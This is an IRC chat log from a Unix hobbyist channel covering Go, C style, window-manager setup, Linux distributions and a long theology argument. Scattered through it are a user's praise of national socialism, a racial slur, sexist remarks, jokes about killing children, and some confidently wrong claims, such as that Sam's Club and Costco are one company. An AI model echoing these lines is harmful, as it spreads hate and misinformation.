07:48        tbuck │  thats called being a kid tho
07:48         BigE │  akacase: well, i am still of the belief that if it is a fucking plant, it shouldnt be illegal
07:48         BigE │  so yeah
07:48         BigE │  lul
07:48         BigE │  let them have at it with opium and cocaine and see how long it is cool to over use drugs
07:49         BigE │  society will either degrade in a matter of months or we will never have to hear jerk offs brag about drugs again
07:49      akacase │  I like beer.
07:50      akacase │  and if I smoke something, it'll be a fucking cigarette.
07:50         BigE │  i too like beer
07:50         BigE │  and scotch
07:50         BigE │  and tobacco
07:50         BigE │  lul

07:55         BigE │  ugh, Go'
07:55         BigE │  i did a bit of it
07:55      akacase │  nice contraction.
07:56         BigE │  the syntax feels so.....
07:56         BigE │  idk, just not smooth
07:56         BigE │  or flowing
07:56      akacase │  odd? yeah, it looks weird.
07:56     NeoTerra │  BigE I don't think so man, I'm busy tonight and tomorrow night
07:56     NeoTerra │  Sunday I have work
07:56         BigE │  it writes weird as well
07:56         BigE │  you suck
07:56      akacase │  hmm, but it sounds so nice.
07:56     NeoTerra │  BigE what about the first friday? As in a week from tomorrow
07:57         BigE │  doesnt matter to me
07:57         BigE │  akacase: i *want* to like it
07:57     NeoTerra │  let's do it then lul
07:57         BigE │  maybe ill go back in a few weeks and have a go
07:57         BigE │  ha
07:57         BigE │  have a go
07:57         BigE │  but seriously
07:58         BigE │  i feel like it does a lot of things, and does none of them well
07:58         BigE │  they have a parallel computing structure that is supposed to be modelled after Erlang, but just looks and feels weird
07:58         BigE │  compiled is great

07:59         BigE │  it feels scripty, which is fine, but once again, the syntax is ass
08:03      akacase │  hmm.
08:03      akacase │  Thompson declared it, an objected oriented C of sorts.
08:03         BigE │  C++ is OO C as well
08:03         BigE │  :P
08:03         BigE │  so is D lang
08:04         BigE │  or C#
08:04         BigE │  idk, i get what Go is trying to do
08:04      akacase │  well, coming from the creator of C, I take that statement a tad more serious.
08:04         BigE │  be a utility language
08:04      akacase │  right.
08:05      akacase │  do you think it'll be a paradigm of sorts?
08:05      akacase │  transition into an OS language?
08:05         BigE │  i dont know
08:05         BigE │  i dont think i know enough about the history of programming languages to make that call
08:05         BigE │  but if i had to guess
08:05         BigE │  no, it wont
08:06      akacase │  haaa: http://gofy.cat-v.org
08:07         BigE │  lul
08:07         BigE │  there was an actively developed python OS for a while as well
08:07         BigE │  Ununoctium if memory serves was the name
08:07      akacase │  sounds slow.
08:07         BigE │  it probably was, i never used it
08:08         BigE │  my point is that python was the next coming of christ for years
08:08         BigE │  and everyone wanted to do everything in it
08:08         BigE │  and in the end, it didnt end up replacing a lot of things like people thought it would
08:10         BigE │  lots of places are building their stuff out of Go now though
08:10         BigE │  like, lots of backend stuff
08:10         BigE │  Google obviously
08:10         BigE │  Cloudflare is also
08:10         BigE │  so who really knows
08:11         BigE │  like i said, i am sure i will take a second look at it in a couple weeks again
08:11         BigE │  maybe it will agree with me more
08:11         BigE │  who knows

10:48        z3bra │  CURLFORM_COPYNAME, "is_ioup"
10:48      bottomy │  yrmt: returning N from main is the exact same as calling exit(N). main's caller either does that internally or it does the equivalent but it must behave the same as if calling exit(N)

10:49        z3bra │  still don't see the point of this
10:49         yrmt │  bottomy: but yeah, so doing exit(0); is the same and shorter than return 0; break;
10:49      bottomy │  why break?
10:49        z3bra │  semantic
10:49         yrmt │  no idea, dcat does that
10:50         yrmt │  who cares about semantic :p
10:50         yrmt │  the break is never reached anyway
10:50      bottomy │  yeh
10:50        z3bra │  a lot of code will never be reached 
10:50        z3bra │  but that's the compiler's job to figure out
10:50         dcat │  I think ending your  statements properly is an okay thing to do
10:50        z3bra │  ^
10:51      bottomy │  how is break ending the statement properly?
10:51      bottomy │  it's perfedctly valid to have cases run through each other
10:51         yrmt │  syntax wise
10:51      bottomy │  not even syntax wise
10:52         yrmt │  I'd just use exit
10:52        z3bra │  yeah, but most of the time, that's not what you want to do

10:52         yrmt │  but in this case, it's the same
10:52        z3bra │  yrmt, so you'll add one more lib
10:52         yrmt │  writing unreachable code is useless
10:52      bottomy │  it gets added anyway
10:53         dcat │  yrmt: if it's the same, why are you making a fuss over it?
10:53        z3bra │  bottomy, yeah sure

10:55         dcat │  z3bra: exactly
10:55         yrmt │  dcat: wut? I'm just trying to understand what's best
10:55        z3bra │  yrmt, there is no "best", as both do the exact same thing
10:55         yrmt │  yeah, I have my answer
10:55         yrmt │  :)
10:55         dcat │  so why complain about someone elses preference?
10:55         yrmt │  I'm not complaining, I was just wondering why do it one way or the other
10:56      bottomy │  the compiler won't care about unecessary breaks, it will still understand where the functions flow will end and re-arrange it all accordingly. this is one of those scenarios where having a break follow a return/exit in a switch is purely stylistic
10:56         yrmt │  yep
10:56         dcat │  as for the exit(0) vs return 0
10:57         yrmt │  yep
10:57         dcat │  the only technical difference is that I have to include stdlib.h
10:57         yrmt │  damn, openbsd is being weird
10:57      bottomy │  no there is other technical differences between the two
10:57      bottomy │  just the overall effect will be the same

19:38       libbro │  I'm going to try eating a ton of veggies and fruit with a little bit of meat and a small amount of grain

19:39        dami0 │  you should eat little grain/potatoes, medium meat and >=medium veggies

19:39       libbro │  Although, that is the hardest part because
19:39       libbro │  My family is basicly powered by rice
19:40       libbro │  I eat rice ALL of the time
19:40      bottomy │  just structure your workout (if you don't already) to do a low rep high weight routine
19:40       libbro │  I don't have any heavy weights at home
19:40       libbro │  So I think I'll have to do the opposite
19:40        dami0 │  go to gym
19:40      bottomy │  the opposite is endurance lifting and that makes you lean

19:42        exaem │  libbro: find out your basal metabolic rate and find out how much exercise you do, then you find out how many calories you eat a day to maintain your current weight then add 500 calories onto it to gain 1lb/week

23:47  thang1thang │  yeah, I really love the idea of computer engineering. I wanna work with intel or something like that, designing CPUs/GPUs, working on quantum computing and shit like that
23:47     earsplit │  without having to go anywhere
23:47  thang1thang │  fuck yeah
23:47     earsplit │  also when you get old
23:47     earsplit │  hedge funds are a great place to find work
23:47  thang1thang │  except I'm ADHD. If I sat on the computer, I could do stuff. If I do it at home, I'll spend all day making color themes for Unix
23:47     earsplit │  and you can make $200,000 +
23:47  thang1thang │  why hedge funds?
23:47     earsplit │  they are loaded with money
23:47     earsplit │  if money is your thing
23:47  thang1thang │  I like money
23:47  thang1thang │  I'd rather do what I enjoy
23:47     earsplit │  yeah same
23:48  thang1thang │  I just happen to be lucky in the fact that I enjoy incredibly lucrative things like programming/engineering
23:48     earsplit │  yeah you're in a good place
23:48  thang1thang │  I feel sorry for some of my friends who are in college and don't want to be, but the only thing they want to do is stuff like being a musician or an artist or whatever
23:48     earsplit │  its better then enjoying philosophy
23:48  thang1thang │  so they take some major like comunications and hope for the best
23:49  thang1thang │  don't get me wrong, I love philosophy and stuff like that and I could probably take several classes in it and love it and read plato and crap like that all day long
23:49  thang1thang │  I just happen to also love computers/tech/engineering and I'm glad I do
23:49     earsplit │  yeah
23:49  thang1thang │  okay dumb question, do I have to init my .xresources anywhere or something?
23:50     earsplit │  yeah i do it at the top of .xinitrc
23:51  thang1thang │  okay, figured I'd need something like that in there because my Urvt still has scroll bars and it's bugging me
23:52  thang1thang │  I'm also loving bspwm, it's damn amazing
23:55  thang1thang │  can't get bar to work for the life of me though...
23:55         quit │  exaem
23:57  thang1thang │  wait wut. How'd you tile bspwm with an "empty" tile?
23:57  thang1thang │  or could you just do the same thing with bspc config left_padding x?

00:26        tbuck │  people come for the music not to party
00:26  thang1thang │  nice
00:27  thang1thang │  it's that way at old school type of metal concerts too, I think
00:28      jjumbii │  although mosh pits look fun
00:28  thang1thang │  lol
00:28      jjumbii │  it's just those fucking idiots who flail their arms around
00:28      jjumbii │  who the fuck invented that shit
00:28  thang1thang │  depends on the crowd, tbh
00:28        tbuck │  ahah i accidentaly tripped someone in a mosh pit i was walking through
00:28        tbuck │  winning
00:29  thang1thang │  if you go to a hardcore metal group, those are some of the nicest guys you'll ever meet

00:36      jjumbii │  thang1thang2: from a christian perspective, thoughts? http://i.imgur.com/515BUfX.jpg
00:37  thang1thang │  The image makes sense if one doesn't understand christianity correctly 
00:37      jjumbii │  ah yes
00:38  thang1thang │  it's actually a nonissue if you consider the fact that hell is never actually mentioned in the bible except for one verse in revelation
00:38      jjumbii │  from what i've put together from going to church each week
00:38  thang1thang │  that verse talks about how "the smoke of shaoel shall rise forever..." (sp?) etc etc
00:38         BigE │  jjumbii: that sounds about right
00:38      jjumbii │  it seems that they generally perceive our lives without god as not as good as it with him
00:38  thang1thang │  However, in the greek translations, you find that the meaning of that verse is referring to the MEMORY of it
00:39  thang1thang │  So, the verse means that, in Heaven, the memory of what has happened on Earth shall endure forever. Not that hell itself is something that is "forever"
00:39      jjumbii │  also, i've wondered
00:39      jjumbii │  how can we be happy in heaven if say, my dad is in hell?
00:39         BigE │  saying the bible has a mistranslation is about as surprising as finding out windows has a gaping security hole
00:39  thang1thang │  lol
00:40  thang1thang │  the bible doesn't have a mistranslation of it
00:40  thang1thang │  what happened is people have a misunderstanding of it because not all the context is there 
00:40         BigE │  except it does
00:40         BigE │  lul
00:40         BigE │  well
00:40         BigE │  i guess
00:40         BigE │  sort of
00:40         join │  kori
00:40         mode │  +v kori
00:40  thang1thang │  the greek had a word for almost EVERYTHING, and their prefixes and suffixes are so complicated that they have several words/concepts that can't exist in english
00:40         kori │  hello
00:40     vompatti │   Ubuntu or crunchbang (if you don't mind a little command line). You could also do BT5 because it's got the convenience of Ubuntu plus a hacking suite or 10. 
00:40     vompatti │  fucking hackforums
00:40  thang1thang │  there's 40+ different words for "you", for example
00:41         BigE │  lul
00:41     vompatti │  why did I even came here anyways
00:41      jjumbii │  vompatti: because you wanted to find something to bitch about
00:41  thang1thang │  with that in mind, is it really so surprising that people from the 1600s, translating from latin which was (in turn) translated from greek
00:41      jjumbii │  i do it all the time
00:41  thang1thang │  would mess up a wee bit?
00:42  thang1thang │  But anyway... Hell doesn't actually exist, which is what I'm guessing is the question here
00:42         BigE │  yeah
00:42         BigE │  which makes for a mistranslation...
00:42      jjumbii │  latin is a pretty loose language
00:42     vompatti │  jjumbii: I was actually only checking the python section first
00:42         BigE │  that is like, the definition of one...
00:42  thang1thang │  are you shitting me?
00:42  thang1thang │  Latin is one of the most concretely gramatically defined languages ever created in the history of mankind
00:43      jjumbii │  thang1thang2: if you haven't learned yet, don't take anything i say seriously
00:43  thang1thang │  It's gramatical structure is so concrete that you can re-arrange the words of any sentence of latin into any order and it would make perfect sense because the tense/object/etc are all stated for each wor
00:43      jjumbii │  and especially anything BigE says
00:43  thang1thang │  lol
00:43  thang1thang │  sorry, I'm just used to people knowing nothing about languages
00:43      jjumbii │  i should start paying attention in Latin class...
00:43      jjumbii │  no wonder I got a 50% on my last test
00:44  thang1thang │  But anyway. Hell doesn't exist. What happens (according to the Bible) is that Jesus comes in the second coming
00:44  thang1thang │  and then, since all those who will be saved have already been judged and found blameless under the Law, they go to heaven with God
00:45  thang1thang │  those who haven't been saved, have been judged and found guilty under the Law. They're then risen up and given the proof of what they did to deserve the sentence
00:45      jjumbii │  and where do they go from there?
00:45  thang1thang │  And it's written in the bible that the entire nation of humanity, past present future, goes down on one knee and worships God and finds that his judgement is correct... and just. (Of their own free will)
00:45      akacase │  #theology 
00:45  thang1thang │  God brings the saved into the gates of new Jerusalem, and then recreates the earth
00:46  thang1thang │  and in his recreating the earth, the fallen angels, satan, and those who are not saved perish
00:46  thang1thang │  Not "burning forever", they just die, and they're gone forever
00:46      bottomy │  earth 2.0
00:46      jjumbii │  why doesn't he just do that now?
00:46      jjumbii │  he/she/it
00:46         BigE │  and then none of that happens cause it is a 6000 year old farce written by people who didnt even know that the earth was round
00:47  thang1thang │  so really, for an atheist, the only thing different if Christianity is correct, is they get woken up for a bit, get told they're incorrect, and they just die and cease to exist
00:47  thang1thang │  no pain at all
00:47        tbuck │  lol i dont think its meant to be taken that literally
00:47      jjumbii │  or maybe i will reincarnate as a bumble bee
00:47  thang1thang │  As for why God doesn't do that now, that's a fairly complicated answer, and I'll probably sound craz(ier) than normal explaining it
00:47      bottomy │  atheists win then
00:48      akacase │  nobody wins, this shit is trivial, it's not testable.
00:48  thang1thang │  (except the saved go to heaven, there is that. But if you're not saved, nothing bad really happens to you)
00:48         quit │  Jayro
00:48      jjumbii │  well that's good
00:48         BigE │  huzzah
00:48      jjumbii │  considering i don't even exist now
00:49  thang1thang │  Hmm, the tl;dr about why God doesn't just kill the non saved now is that the time isn't here yet. It's helpful to the understanding of a lot of theology to think of the whole process as a large trial
00:49     NeoTerra │  UnixHub philosophy, not even once
00:49         BigE │  cause i certainly dont want to be stuck for eternity with the stuckup asswipes who are evangelists now
00:49      jjumbii │  NeoTerra: this is good shit man
00:49      jjumbii │  BigE: there will be free donuts
00:49      bottomy │  what happens to the animals?
00:49      jjumbii │  and coffee, i'm sure
00:49         BigE │  not worth it
00:49      jjumbii │  and plenty of virgins
00:49  thang1thang │  When satan rebelled against God, all He did was say that "Well God, if you're the perfect aspect of Love and fairness, then I say you're not fair and if you ARE fair then you'll prove it"
00:50  thang1thang │  BigE: Yeh man, what about those 77 virgins and stuff?
00:50  thang1thang │  So the tree of good/evil in the garden of Eden was a test. Phase 1 of the trial God vs Satan
00:50      bottomy │  77 times to have terrible sex, can't wait!
00:51      jjumbii │  thang1thang2: why test us when he is all knowing
00:51         BigE │  thang1thang2: i believe that in the Koran it actually translates to 77 of whatever you desire
00:51  thang1thang │  Because of the scientific method lol
00:51      jjumbii │  I would like 30 virgins
00:51         BigE │  and because virgins are like, so important for somereason, they have been picked
00:51  thang1thang │  You test something rigorously, not so that YOU believe it, but so that others can believe what you say is true, and find it concretely and wholly true
00:51         BigE │  also, it is 72 virgins
00:51         BigE │  not 77
00:51      jjumbii │  that way i can alternate when they are having their period
00:52         BigE │  jjumbii: over eternity, wouldnt their cycles all sync up?
00:52      bottomy │  what if they all are on the same cycle lol
00:52      jjumbii │  shit
00:52      jjumbii │  i forgot that happens
00:52  thang1thang │  the reason virgins are important comes to the historical importance of virginity in that time period. Virgins were important because, in order to keep the family name intact, bla bla bla...
00:52         BigE │  yup
00:52  thang1thang │  hence why the koran would've mentioned virgins.
00:53  thang1thang │  the Angels are a higher dimensional being than us, and are among the smartest beings in the universe. Their vast intellect would put us to shame
00:53         BigE │  i dont think the koran mentions it
00:53         BigE │  i think it is the muslim culture that does
00:53  thang1thang │  do you really think someone who accuses God of being unfair would be satisfied with "well bro, I'm God, and I knwo everything, and I PROMISE... I'm fair, really, trust me. Want a cookie?"
00:54         BigE │  that or one of the books that are derivative teachings of the koran
00:54         BigE │  lul
00:54  thang1thang │  ^ yeah you're right, it's not the koran specifically
00:54  thang1thang │  my mistake
00:55      jjumbii │  this always bothered me as well
00:55      jjumbii │  http://media-cache-ec0.pinimg.com/736x/07/55/6e/07556e87ceb28dbcb7d33a6af0b5a963.jpg
00:55  thang1thang │  But seriously. If you think about it, why would ANYONE be satisfied with God just saying He's fair? In Jesus' teachings, He never said you should believe in God because He "said so" you should believe in God because you CHOOSE to
00:55  thang1thang │  This is why dying the second death isn't a bad thing at all, it's simply you choosing not to be with God. So okay, since God is everywhere, the only other option is to just die, which isn't a bad thing tbh
00:56  thang1thang │  again, comes down to the whole idea of God vs Satan as a trial to prove that god is just and righteous. One of the conditions is that everyone must make a choice, if they can
00:57  thang1thang │  to choose between God and not following him, you must know about him right?
00:57     NeoTerra │  how about this: be a good person and treat people the way you want to be treated and stop worrying about a God, just get on with your life
00:57     NeoTerra │  there I solved everyone's problems
00:57  thang1thang │  hence Jesus telling his disciples to proclaim the good news of salvation to all nations in the name of the Father, Son and Holy Spirit
00:57  thang1thang │  lol
00:57      bottomy │  thang1thang2: if people get judged when they die deciding whether they go to Heaven or not. What happens to the rest of the animals?
00:58  thang1thang │  humans aren't animals
00:58         BigE │  i think one of my favorite quotes goes something like "if god is willing to prevent evil, but cannot, then he is not omnipotent. if he is able but not willing, than he is malevolent. if he is both able and will, then where does evil come from? if he is neither able nor willing, then why call him god?"
00:58  thang1thang │  well, we are and aren't
00:58        tbuck │  wut
00:58      bottomy │  but what happens to the animals
00:59         BigE │  bottomy: they fade into non existance because evolution is a farce and no animal could ever attain the intellectual capacity of humans
00:59  thang1thang │  We're animals, but are on a higher plane of intelligence than animals, and we have free will where animals merely have instinct. They cannot choose between God and satan because they cannot comprehend that type of choice
00:59  thang1thang │  tl;dr all animals go to heaven
00:59      jjumbii │  thang1thang2: what about an eskimo who hasn't heard of God
00:59         BigE │  but un-baptised babies who die? They go to purgatory forever.
00:59      jjumbii │  wouldn't he go as well?
00:59  thang1thang │  un-baptised babies go to heaven
00:59         BigE │  cause so much logic
00:59         BigE │  orly
00:59         BigE │  see
01:00         BigE │  this is why i stopped caring a long time ago
01:00         BigE │  cause it is an incomprehensible mess of double standards and exceptions
01:00  thang1thang │  the mosaic law stated that anyone under the age of 12 was under the religious protection of their parents, and as such anyone under 12 was considered unable to comprehend a choice, and they were automatically saved
01:00      jjumbii │  BigE: Matthew 19:14 "But Jesus said, “Let the little children come to me and do not hinder them, for to such belongs the kingdom of heaven.”
01:00         BigE │  sort of like the java JVM
01:00         BigE │  OH
01:00  thang1thang │  lol
01:00      bottomy │  lol
01:00      jjumbii │  solved that one
01:00     NeoTerra │  that was a good one BigE :P
01:00         BigE │ bows
01:00  thang1thang │  java JVM?
01:01      jjumbii │  java java virtual machine, duh
01:01  thang1thang │  well yeah
01:01         BigE │  lul
01:01         BigE │  oracle jvm*
01:01  thang1thang │  just didn't quite get where it came into the conversation ._.
01:01  thang1thang │  oh nvm, I get it now
01:01      bottomy │  if that's the case wouldn't the nicest thing to do be to kill kids? even if that means you won't go to heaven, you're then guaranteeing many will.
01:02      jjumbii │  abort all!!!!!
01:02  thang1thang │  theoretically, I guess that's true, but seriously... What a stupid idea
01:02         dcat │  morning bruhs
01:02      jjumbii │  dcat: welcome to unixhub philosophy night
01:02      jjumbii │  or morning
01:02  thang1thang │  As for the eskimo who hasn't heard of God, that comes under the fact that God deals with each person on their own merits and loves everyone unconditionally
01:03         BigE │  so then
01:03  thang1thang │  and the final wonderful answer is "it depends on how that person lived their life, just like it depends on how a Christian lives their life whether they go to heaven or not"
01:03      jjumbii │  thang1thang2: surely he would go to heaven though?
01:03         BigE │  why cant you just live life as a good person
01:03  thang1thang │  well, it depends of course
01:03         BigE │  and thats it
01:03         BigE │  lul
01:03      jjumbii │  if he didn't know, how could he be held accountable?
01:03  thang1thang │  if that eskimo was a rapist and a killer and hated society
01:03      jjumbii │  just like children
01:03  thang1thang │  he probably wouldn't be the type of person that liked heaven
01:03      jjumbii │  BigE: I agree
01:04  thang1thang │  why would he even want to go there anyway? Being forced to live for eternity with a being of eternal love?
01:04         BigE │  and what about people of other religions who are never even exposed to christianity?
01:04      jjumbii │  BigE: i suppose they would go to heaven as well
01:04         BigE │  the bible and christianity as a whole have more asterisks attached to it than a fuckind regex table
01:04      jjumbii │  tl;dr we should burn all the bibles
01:04         BigE │  fucking*
01:04  thang1thang │  lol
01:04  thang1thang │  it's kinda simple if you think about it, I guess. Trying to find all sorts of exceptions is beside the point
01:05         shix │  lol, must suck to be in the UK right now
01:05      jjumbii │  shix: why
01:05         shix │  because of the porn filter
01:05  thang1thang │  You can call yourself a christian, but not love God and you could still end up dying the second death
01:05         shix │  apparently its more than just a porn filter
01:05      bottomy │  this all just sounds like some terms and conditions with a whole bunch of *'s
01:05  thang1thang │  shix: open directories
01:05      bottomy │  jjumbii: or plan B, burn all babies
01:05         BigE │  bottomy: because it is
01:05         BigE │  lul
01:06      jjumbii │  i kinda like to think that i will become a flower when i die
01:06  thang1thang │  God saves those who want to be saved, kinda as simple as that. if you die before you can make a choice, you're saved
01:06      jjumbii │  then some animal will eat me
01:06      jjumbii │  and i will become a rabbit
01:06      bottomy │  lol
01:07  thang1thang │  If you're never told of a choice, you therefore didn't make one. Because of that, it'll come down to your nature
01:07  thang1thang │  which is what it really comes down to in the first place for everyone, including christians
01:07      jjumbii │  thang1thang2: i appreciate you not being one of those Christians who use God to get what they want
01:08  thang1thang │  lol screw that type of thinking

01:10      jjumbii │  thang1thang2: idk, it's just hard for me to grasp that
01:10  thang1thang │  jjumbii, just to let you know, Jesus specifically called out the rabbis and leaders of the jewish religion 
01:10         shix │  Apparently, simply thinking hard with your hands pressed together works every time
01:10         quit │  exaem

02:24         shix │  NeoTerra: the whole point of the IB program is that its supposed to be harder lul
02:25         shix │  the rest of the school doesn't have to do shit
02:26      jjumbii │  i can vouch for that
02:26      jjumbii │  we don't do anything really

03:37       libbro │  I'
03:37         dcat │  I just believe national socialism is an awesome political system
03:37       libbro │  Oh.

03:37         dcat │  nazis
03:38       libbro │  Well if you don't want to be associated them, fascism is a better term to use

03:38         dcat │  lel
03:39       libbro │  I'm not even joking
03:39       libbro │  It still has negative connotations...
03:39       libbro │  But *less* negative
03:39         dcat │  I think national socialism is the proper term to use
03:39       libbro │  Why so?
03:40       libbro │  What differs between say Italian fascism and NS?
03:40         dcat │  as in the term
03:40         dcat │  the mixing of "nationalism" and "socialism"
03:41       libbro │  Fascism is pretty much just highly authoritarian, corporate socialism
03:41         dcat │  bruh
03:41       libbro │  Using corporate in the correct way, not in the modern sense
03:41         dcat │  lets not get into politics

03:42       libbro │  8?
03:42         dcat │  oh wait nvm
03:43         dcat │  last time I installed it, my "product key" wasn't vaild
03:43       libbro │  Why do you need to install Windows?
03:43         dcat │  I wanted to play skyrim ;_;
03:44       libbro │  dcat: Ouch...
03:44       libbro │  dcat: Just contact microsoft and...
03:44       libbro │  You'll probably be ale to reactivate the key
03:44         dcat │  it would've been fine if I bought it without steam
03:44         dcat │  how do I do that?
03:45       libbro │  Just go on their website and...
03:45       libbro │  Contact customer support...
03:45         dcat │  nah, fuck them
03:45       libbro │  Email them if you have to
03:46       libbro │  dcat: But Skyrim..
03:46         dcat │  it's a sign that I shouldn't use their OS
03:46       libbro │  dcat: One does not simply run Skyrim on WINE
03:46        tbuck │  lol
03:46         dcat │  true

03:46       libbro │  All Gold or above...
03:47       libbro │  surprising
03:47         dcat │  yeah, but that isn't in steam
03:47       libbro │  Sorry, Silver or above
03:47       libbro │  http://appdb.winehq.org/objectManager.php?sClass=version&iId=24749
03:47       libbro │  This is the steam version
03:47       libbro │  It's there
03:47       libbro │  it has a Gold rating

03:49        tbuck │  i had fallout NV working but it would crash randomly
03:49        tbuck │  it got too annoying to play
03:49       libbro │  Speaking of Fallout..
03:49       libbro │   have Fallout 1 and 2 on GOG
03:49       libbro │  Got both for free
03:49         dcat │  if you listen through that whole song, and follow the lyrics, your mind will be blown
03:50       libbro │  Spotify's web player is nice
03:50       libbro │  I should use that instead
03:51       libbro │  dcat: So, are ya gonna install it on WINE?
03:51         dcat │  well
03:51         dcat │  first I need to get a OS on it
03:52       libbro │  Oh... 
03:52       libbro │  Install Gentoo
03:52         dcat │  lulno
03:52         dcat │  I've always hated gentoo
03:52       libbro │  lol
03:52       libbro │  Never used it before
03:53       libbro │  Don't plan on it
03:53         dcat │  I think it's uneccesary to compile everything from scratch nowdays
03:53       libbro │  I agree
03:53       libbro │  It uses too much resources
03:54       libbro │  Plus, I don't like installing dev packages
03:54         dcat │  favourite OS of all time is openbsd
03:54         dcat │  but it doesn't work with my vidyacard
03:54       libbro │  I've never used OpenBSD to be honest
03:54         dcat │  ;_;
03:55       libbro │  Don't kill me
03:55         dcat │  maybe slackware
03:55         dcat │  I haven't used it in a while
03:55       libbro │  I liked Slackware
03:55         dcat │  it feels pretty horrible
03:55         dcat │  I've found "my" distro
03:56         dcat │  but I can't run it cause of my shitty video card
03:56       libbro │  Fork the drivers m8
03:56         dcat │  from what?
03:56       libbro │  That's what GNU/Stallman would want
03:56         dcat │  linux? lel
03:57         dcat │  niglux*
03:57         dcat │  I'm gonna start using that from now on

03:58         dcat │  meh
03:58         dcat │  fuck being politically correct

04:00         dcat │  meh
04:00         dcat │  I'll just run slackware

04:01        tbuck │  slackware has been my friend lately
04:01         dcat │  I just hate how much shit they include in the "basic" install
04:01        tbuck │  yeah thats just the nature of slack
04:02        tbuck │  got everything you need and then some
04:02         dcat │  lel
04:02       libbro │  dcat: You have the option to not install them
04:02        tbuck │  i mananged to get my tagfiles down to about 1/2 the packages tho
04:02         dcat │  lets include kde in the install
04:02         dcat │  libbro: yeah, but then I manually need to go through every package
04:02        tbuck │  dcat: tagfiles
04:02         dcat │  and if you install all sets, that takes ages
04:03        tbuck │  ive got mine on github that you can use
04:03         dcat │  sweet
04:03       libbro │  BRB, memory leaks

04:23      jjumbii │  thy shalt not needeth addition to the problem
04:24         dcat │  I've always considered yrmt the prince of rice
04:24      jjumbii │  who's the king?
04:25      jjumbii │  basically, yrmt is the king
04:25      jjumbii │  this entire community was his idea ;)
04:25       libbro │  In the beginning god created rice
04:25       libbro │  and he saw that it was good
04:26      jjumbii │  and yrmt emerge
04:26       libbro │  and on the 3rd day he created yrmt
04:26       libbro │  But yrmt was lonely so he took his rib and create his wife, Unixhub
04:26        tbuck │  dat waifu
04:26        tbuck │  unixhubbies
04:26      jjumbii │  libbro: that's actually what happened
04:27       libbro │  God told yrmt that he could eat all of the rice in the garden, except the rice on RMS feet
04:27       libbro │  For a period of time yrmt obeyed His orders...
04:27         dcat │  to me it doesn't matter how riced your desktop is if you run 5 exec? lines in your conky
04:27       libbro │  But eventually, yrmt's wife made him eat the rice of Stallman's feet
04:28        tbuck │  conky lol
04:28      jjumbii │  this was my first scrot of all time
04:28      jjumbii │  http://i.imgur.com/kCiar.png

04:29      jjumbii │  and my latest
04:29      jjumbii │  http://i.imgur.com/rJsvSzy.png
04:30        tbuck │  oh i found it
04:30       libbro │  yrmt realized that God was looking at him and that he was naked.
04:30        tbuck │  http://i.imgur.com/WgtMhoK.png
04:30        tbuck │  first time on something besides bubuntu
04:30       libbro │  So yrmt put on the fedora of the fedora tree
04:31      jjumbii │  tbuck: not bad
04:31        tbuck │  yeah i was still getting familiar but it worked for me
04:31       libbro │  Then, yrmt and all of Unixhub was banished out of HF and sent to the land of proprietary firmware
04:31        tbuck │  quickly ditched awesomewm
04:31       libbro │  And that's how Unixhub came to be
04:33         trgc │  anyone have any idea on getting twobwm to run
04:33      jjumbii │  libbro: basically how it happened was
04:33      jjumbii │  yrmt (Beastie at the time) pm'd me: "yo bro, I want to make my own community, let's ditch this place and make a UNIX community"
04:33        tbuck │  jjumbii: official word on 432Hz from my music producer buddy: its hippy BS
04:33      jjumbii │  tbuck: i realized that after awhile lol
04:33        tbuck │  lol
04:34      jjumbii │  432Hz is a set frequency
04:34      jjumbii │  how can there still be music
04:34       libbro │  jjumbii: lol. And that's how the empire came to be
04:35      jjumbii │  pretty much
04:35      jjumbii │  then like Test-run, shix, Jayro came
04:35      jjumbii │  and gurhush, Joom later
04:35      jjumbii │  and i forgot the rest
04:37        tbuck │  woa someone posted to wmporn

05:59       libbro │  dcat: They are classes people take in the US that involve skills such as carpentry, metallurgy, etc
05:59         dcat │  instead of calculus and all of that crap

06:00      jjumbii │  lol
06:01      jjumbii │  they are the gateway to corruption and nudes
06:01         BigE │  bottomy: omg I havent heard that since my HF days

06:02      jjumbii │  libbro, eh, i wouldn't worry too much
06:02       libbro │  jjumbii: And I don't like being the first one to message girls
06:02      jjumbii │  same
06:02       libbro │  It ruins the "process"
06:02         dcat │  also, something that's awesome about norwegian high school/college
06:03         dcat │  instead of drinking every day like in the stereotypical american college
06:03       libbro │  jjumbii: I feel bad, but I have a process of getting girls to be into me, usually works
06:03         dcat │  we get 17 days to drink like madmen
06:03       libbro │  I may be exaggerating a bit, but it's pretty effective
06:03      jjumbii │  libbro, plz explain
06:03         dcat │  and we wear uniforms in the colours of the subject were taking

06:04       libbro │  fenriz: I don't want piggu wimmin, I want pure Asian waifus
06:04      bottomy │  BigE: it's dead easy but I'm most likely going to get exemptions for most of the classes. though it's kind of dumb I still end up having to pay for it all, even if I were to get exemptions for majority of the classes (even if I could get it for all of them) since still need that qualification so I can then go into degree course >.>

07:03      jjumbii │  it can do anything
07:03      jjumbii │  it's amazing
07:04      jjumbii │ 's attempts at making BigE rage failed epicly.

07:05         dcat │  seriously though
07:05         dcat │  go is the best programming language ever
07:05      jjumbii │  go really is a good language
07:05         dcat │  yeah
07:05         dcat │  it can do /everything/
07:05      jjumbii │  i should learn it
07:06      jjumbii │  i can do so good in uni if i learn it
07:09         BigE │  until you realize that they probably wont let you do most of your course work in it
07:10        tbuck │  java
07:10        tbuck │  expect java
07:10      jjumbii │  im actually really good at java 
07:10      jjumbii │  OOP is master race
07:10         dcat │  have you ever tried golang BigE?
07:11         BigE │  I have tried it a bit
07:11         BigE │  the syntax is yucky
07:11         BigE │  lu
07:12         dcat │  what do you not like about it?
07:13         BigE │  the syntax just feels weird
07:13         BigE │  then again, the only OOP languages I have done before are Java
07:13         BigE │  but still
07:14         BigE │  but like I was telling jjumbii last night, I tried it for a day, ill probably go back and try it again in a few weeks and see how it goes
07:15      jjumbii │  go actually works really well with plan9...

07:34         shix │  aren't they called DUI checkpoints?
07:34         BigE │  and then you lie and they let you go?

07:51         shix │  even though its not really a simulator
07:54     NeoTerra │  it was okay, I thought it got tedious after awhile
07:54         shix │  yeah, i know what you mean
07:54         shix │  check every single paper only to find out you forgot to check the gender

08:03        tbuck │  i dont know where the nearest costco is
08:03  thang1thang │  okay I think I need to change a IRC config here or there
08:04  thang1thang │  my auto join irc.unixhub.net is joining it 2-3 times I think
08:04         BigE │  you are missing out
08:04        tbuck │  i know... we've got this sams club place that is pretty similar
08:04         quit │  jjumbii
08:04  thang1thang │  but anyway, be mudafucking jelly of me, bitches; I got my autohide+disable cursor hotkey to work
08:04  thang1thang │  sam's club == costco
08:04  thang1thang │  it's same company, just different store name
08:04        tbuck │  lol
08:04        tbuck │  TIL
08:04  thang1thang │  like how safeway is named robin's in canada or something
